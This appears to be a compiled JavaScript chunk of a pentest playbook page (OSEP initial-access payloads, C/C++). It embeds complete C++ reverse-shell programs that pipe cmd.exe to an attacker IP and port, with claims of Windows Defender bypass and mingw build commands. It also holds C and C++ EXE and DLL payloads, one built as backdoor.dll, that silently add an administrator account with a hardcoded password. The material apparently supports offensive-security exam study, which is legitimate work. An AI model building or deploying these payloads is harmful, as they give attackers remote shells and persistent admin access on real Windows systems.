"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[1578],{687(n,e,r){r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"osep/initial-access/Payloads/C\u2044C++","title":"C/C++","description":"EXE","source":"@site/docs/osep/initial-access/Payloads/C\u2044C++.md","sourceDirName":"osep/initial-access/Payloads","slug":"/osep/initial-access/Payloads/C\u2044C++","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/C\u2044C++","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"C/C++","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"C#","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/C-sharp"},"next":{"title":"PowerShell","permalink":"/OSEP-Playbook/docs/osep/initial-access/Payloads/Powershell"}}');var t=r(4848),i=r(8453);const a={title:"C/C++",sidebar_position:1},o=void 0,d={},c=[{value:"<strong>EXE</strong>",id:"exe",level:3},{value:"<strong>Reverse Shell</strong>",id:"reverse-shell",level:3},{value:"<strong>Reverse Shell Alternative</strong>",id:"reverse-shell-alternative",level:3},{value:"<strong>Add New Admin</strong>",id:"add-new-admin",level:3},{value:"<strong>DLL</strong>",id:"dll",level:3},{value:"<strong>New Admin with C</strong>",id:"new-admin-with-c",level:3},{value:"<strong>New Admin with C++</strong>",id:"new-admin-with-c-1",level:3}];function l(n){const e={a:"a",code:"code",h3:"h3",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h3,{id:"exe",children:(0,t.jsx)(e.strong,{children:"EXE"})}),"\n",(0,t.jsx)(e.h3,{id:"reverse-shell",children:(0,t.jsx)(e.strong,{children:"Reverse Shell"})}),"\n",(0,t.jsx)(e.p,{children:"Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target. The IP and PORT need to be specified statically in the file before compilation."}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Compiling with Linux"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Execution"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:".\\rev.exe\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Code"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-cpp",children:'#include <winsock2.h>#include <windows.h>#include <ws2tcpip.h>#include <stdio.h>#pragma comment(lib, "ws2_32.lib")// Function to handle the reverse shell\nDWORD WINAPI ReverseShell(LPVOID lpParam) {\n    SOCKET sock = *(SOCKET*)lpParam;\n\n    // Redirect standard input, output, and error to the socket\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    ZeroMemory(&si, sizeof(si));\n    si.cb = sizeof(si);\n    si.dwFlags = STARTF_USESTDHANDLES;\n    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;\n\n    // Create a mutable copy of the command string\n    char cmd[] = "cmd.exe";\n\n    // Create a new cmd.exe process with the redirected handles\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);\n\n    // Wait for the process to finish\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Clean up\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n    closesocket(sock);\n\n    return 0;\n}\n\nint main() {\n    WSADATA wsaData;\n    SOCKET sock;\n    struct sockaddr_in server;\n    char ip[] = "192.168.1.100"; // Replace with your IP address\n    int port = 4444;             // Replace with your port\n\n    // Initialize Winsock\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n\n    // Create socket\n    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\n    // Define server address\n    server.sin_family = AF_INET;\n    server.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &server.sin_addr.s_addr);\n\n    // Connect to server\n    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {\n        printf("Connection failed!\\n");\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    // Create a new thread for the reverse shell\n    HANDLE thread = CreateThread(NULL, 0, ReverseShell, &sock, 0, NULL);\n    if (thread == NULL) {\n        printf("Failed to create thread!\\n");\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    // Optionally, wait for the thread to finish (or perform other tasks)\n    WaitForSingleObject(thread, INFINITE);\n\n    // Clean up\n    CloseHandle(thread);\n    WSACleanup();\n\n    return 0;\n}\n\n'})}),"\n",(0,t.jsx)(e.h3,{id:"reverse-shell-alternative",children:(0,t.jsx)(e.strong,{children:"Reverse Shell Alternative"})}),"\n",(0,t.jsx)(e.p,{children:"Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target. The IP and PORT need to be specified statically in the file before compilation."}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Compiling with Linux"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Execution"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:".\\rev.exe 192.168.45.195 9001\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Code"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-cpp",children:'#include <winsock2.h>#include <windows.h>#include <ws2tcpip.h>#include <stdio.h>#pragma comment(lib, "ws2_32.lib")// Function to handle the reverse shell\nDWORD WINAPI ReverseShell(LPVOID lpParam) {\n    SOCKET sock = *(SOCKET*)lpParam;\n\n    // Redirect standard input, output, and error to the socket\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    ZeroMemory(&si, sizeof(si));\n    si.cb = sizeof(si);\n    si.dwFlags = STARTF_USESTDHANDLES;\n    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;\n\n    // Create a mutable copy of the command string\n    char cmd[] = "cmd.exe";\n\n    // Create a new cmd.exe process with the redirected handles\n    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {\n        printf("CreateProcess failed. Error: %d\\n", GetLastError());\n        closesocket(sock);\n        return 1;\n    }\n\n    // Wait for the process to finish\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Clean up the process\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    // Close the socket\n    closesocket(sock);\n\n    return 0;\n}\n\nint main(int argc, char* argv[]) {\n    // Check if the correct number of arguments is provided\n    if (argc != 3) {\n        printf("Usage: %s <IP> <Port>\\n", argv[0]);\n        return 1;\n    }\n\n    // Parse IP and port from command-line arguments\n    const char* ip = argv[1];\n    int port = atoi(argv[2]);\n\n    WSADATA wsaData;\n    SOCKET sock;\n    struct sockaddr_in server;\n\n    // Initialize Winsock\n    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n        printf("WSAStartup failed.\\n");\n        return 1;\n    }\n\n    // Create socket\n    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n    if (sock == INVALID_SOCKET) {\n        printf("Socket creation failed.\\n");\n        WSACleanup();\n        return 1;\n    }\n\n    // Define server address\n    server.sin_family = AF_INET;\n    server.sin_port = htons(port);\n    if (inet_pton(AF_INET, ip, &server.sin_addr.s_addr) <= 0) {\n        printf("Invalid IP address.\\n");\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    // Connect to server\n    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {\n        printf("Connection failed.\\n");\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    // Create a new thread for the reverse shell\n    HANDLE thread = CreateThread(NULL, 0, ReverseShell, &sock, 0, NULL);\n    if (thread == NULL) {\n        printf("Failed to create thread.\\n");\n        closesocket(sock);\n        WSACleanup();\n        return 1;\n    }\n\n    // Wait for the reverse shell thread to finish\n    WaitForSingleObject(thread, INFINITE);\n\n    // Clean up the thread handle\n    CloseHandle(thread);\n\n    // Clean up Winsock\n    WSACleanup();\n\n    return 0;\n}\n\n'})}),"\n",(0,t.jsx)(e.h3,{id:"add-new-admin",children:(0,t.jsx)(e.strong,{children:"Add New Admin"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:"Explanation"}),"\xa0It will create a new admin user:\xa0",(0,t.jsx)(e.code,{children:"amit:Password123!"}),"."]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Compiling"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"# For 32-bits\ni686-w64-mingw32-gcc -oadduser32.exe adduser.c -lnetapi32\n\n# For 64-bits\nx86_64-w64-mingw32-gcc -oadduser64.exe adduser.c -lnetapi32\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Code"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-c",children:'/*\n * ADDUSER.C: creating a Windows user programmatically.\n */\n\n#define UNICODE#define _UNICODE#include <windows.h>#include <string.h>#include <Lmaccess.h>#include <lmerr.h>#include <Tchar.h>\n\nDWORD CreateAdminUserInternal(void)\n{\nNET_API_STATUS rc;\nBOOL b;\nDWORD dw;\n\nUSER_INFO_1 ud;\nLOCALGROUP_MEMBERS_INFO_0 gd;\nSID_NAME_USE snu;\n\nDWORD cbSid = 256;\t// 256 bytes should be enough for everybody :)\nBYTE Sid[256];\n\nDWORD cbDomain = 256 / sizeof(TCHAR);\nTCHAR Domain[256];\n\n    //\n    // Create user\n    // http://msdn.microsoft.com/en-us/library/aa370649%28v=VS.85%29.aspx\n    //\n\n    memset(&ud, 0, sizeof(ud));\n\n    ud.usri1_name\t\t= _T("amit");\t\t\t\t\t\t// username\n    ud.usri1_password\t= _T("Password123!");\t\t\t\t// password\n    ud.usri1_priv\t\t= USER_PRIV_USER;\t\t\t\t\t// cannot set USER_PRIV_ADMIN on creation\n    ud.usri1_flags\t\t= UF_SCRIPT | UF_NORMAL_ACCOUNT;\t// must be set\n    ud.usri1_script_path = NULL;\n\n    rc = NetUserAdd(\n        NULL,\t\t\t// local server\n        1,\t\t\t\t// information level\n        (LPBYTE)&ud,\n        NULL\t\t\t// error value\n    );\n\n    if (rc != NERR_Success) {\n        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\\r\\n"), rc, rc);\n        return rc;\n    }\n\n    //\n    // Get user SID\n    // http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx\n    //\n\n    b = LookupAccountName(\n        NULL,\t\t\t// local server\n        _T("audit"),\t// account name\n        Sid,\t\t\t// SID\n        &cbSid,\t\t\t// SID size\n        Domain,\t\t\t// Domain\n        &cbDomain,\t\t// Domain size\n        &snu\t\t\t// SID_NAME_USE (enum)\n    );\n\n    if (!b) {\n        dw = GetLastError();\n        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\\r\\n"), dw, dw);\n        return dw;\n    }\n\n    //\n    // Add user to "Administrators" local group\n    // http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx\n    //\n\n    memset(&gd, 0, sizeof(gd));\n\n    gd.lgrmi0_sid = (PSID)Sid;\n\n    rc = NetLocalGroupAddMembers(\n        NULL,\t\t\t\t\t// local server\n        _T("Administrators"),\n        0,\t\t\t\t\t\t// information level\n        (LPBYTE)&gd,\n        1\t\t\t\t\t\t// only one entry\n    );\n\n    if (rc != NERR_Success) {\n        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\\r\\n"), rc, rc);\n        return rc;\n    }\n\n    return 0;\n}\n\n//\n// DLL entry point.\n//\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        CreateAdminUserInternal();\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n//\n// RUNDLL32 entry point.\n// https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface\n//\n\n#ifdef __cplusplusextern "C" {\n#endif__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)\n{\n    CreateAdminUserInternal();\n}\n\n#ifdef __cplusplus}\n#endif//\n// Command-line entry point.\n//\n\nint main()\n{\n    return CreateAdminUserInternal();\n}\n\n'})}),"\n",(0,t.jsx)(e.h3,{id:"dll",children:(0,t.jsx)(e.strong,{children:"DLL"})}),"\n",(0,t.jsx)(e.h3,{id:"new-admin-with-c",children:(0,t.jsx)(e.strong,{children:"New Admin with C"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:"Explanation"}),"\xa0It will create a new admin user:\xa0",(0,t.jsx)(e.code,{children:"amit:Password123!"}),", see the\xa0",(0,t.jsx)(e.a,{href:"https://github.com/gustanini/DLL-Hijack-POC/tree/main",children:"GitHub reference"}),"."]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Compiling"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"x86_64-w64-mingw32-gcc -shared -o backdoor.dll newadmin.cpp\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Code"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-c",children:'/*\n * ADDUSER.C: creating a Windows user programmatically.\n */\n\n#define UNICODE#define _UNICODE#include <windows.h>#include <string.h>#include <lmaccess.h>#include <lmerr.h>#include <tchar.h>\n\nDWORD CreateAdminUserInternal(void)\n{\n    NET_API_STATUS rc;\n    BOOL b;\n    DWORD dw;\n\n    USER_INFO_1 ud;\n    LOCALGROUP_MEMBERS_INFO_0 gd;\n    SID_NAME_USE snu;\n\n    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)\n    BYTE Sid[256];\n\n    DWORD cbDomain = 256 / sizeof(TCHAR);\n    TCHAR Domain[256];\n\n    // Create user\n    memset(&ud, 0, sizeof(ud));\n\n    ud.usri1_name        = _T("amit");                // username\n    ud.usri1_password    = _T("Password123!");             // password\n    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation\n    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set\n    ud.usri1_script_path = NULL;\n\n    rc = NetUserAdd(\n        NULL,            // local server\n        1,                // information level\n        (LPBYTE)&ud,\n        NULL            // error value\n    );\n\n    if (rc != NERR_Success) {\n        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\\r\\n"), rc, rc);\n        return rc;\n    }\n\n   _tprintf(_T("NetUserAdd OK\\r\\n"), rc, rc);\n\n    // Get user SID\n    b = LookupAccountName(\n        NULL,            // local server\n        ud.usri1_name,   // account name\n        Sid,             // SID\n        &cbSid,          // SID size\n        Domain,          // Domain\n        &cbDomain,       // Domain size\n        &snu             // SID_NAME_USE (enum)\n    );\n\n    if (!b) {\n        dw = GetLastError();\n        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\\r\\n"), dw, dw);\n        return dw;\n    }\n\n    // Add user to "Administrators" local group\n    memset(&gd, 0, sizeof(gd));\n\n    gd.lgrmi0_sid = (PSID)Sid;\n\n    rc = NetLocalGroupAddMembers(\n        NULL,                    // local server\n        _T("Administrators"),\n        0,                        // information level\n        (LPBYTE)&gd,\n        1                        // only one entry\n    );\n\n    if (rc != NERR_Success) {\n        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\\r\\n"), rc, rc);\n        return rc;\n    }\n\n    return 0;\n}\n\n//\n// DLL entry point.\n//\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        CreateAdminUserInternal();\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n// RUNDLL32 entry point\n#ifdef __cplusplusextern "C" {\n#endif__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)\n{\n    CreateAdminUserInternal();\n}\n\n#ifdef __cplusplus}\n#endif// Command-line entry point.\nint main()\n{\n    return CreateAdminUserInternal();\n}\n\n'})}),"\n",(0,t.jsx)(e.h3,{id:"new-admin-with-c-1",children:(0,t.jsx)(e.strong,{children:"New Admin with C++"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:"Explanation"}),"\xa0It will create a new admin user:\xa0",(0,t.jsx)(e.code,{children:"amit:Password123!"}),", see the\xa0",(0,t.jsx)(e.a,{href:"https://github.com/newsoft/adduser/blob/master/adduser.c",children:"GitHub reference"}),"."]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Compiling"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"# For 32-bits\ni686-w64-mingw32-gcc -shared -oadduser32.dll adduser.c -lnetapi32\n\n# For 64-bits\nx86_64-w64-mingw32-gcc -shared -oadduser64.dll adduser.c -lnetapi32\n\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Code"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-cpp",children:'#include <stdlib.h>#include <windows.h>\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,\nDWORD ul_reason_for_call,\nLPVOID lpReserved )\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH:\n        int i;\n          i = system ("net user amit Password123! /add");\n          i = system ("net localgroup administrators amit /add");\n        break;\n        case DLL_THREAD_ATTACH:\n        break;\n        case DLL_THREAD_DETACH:\n        break;\n        case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n'})})]})}function h(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(l,{...n})}):l(n)}},8453(n,e,r){r.d(e,{R:()=>a,x:()=>o});var s=r(6540);const t={},i=s.createContext(t);function a(n){const e=s.useContext(i);return s.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:a(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);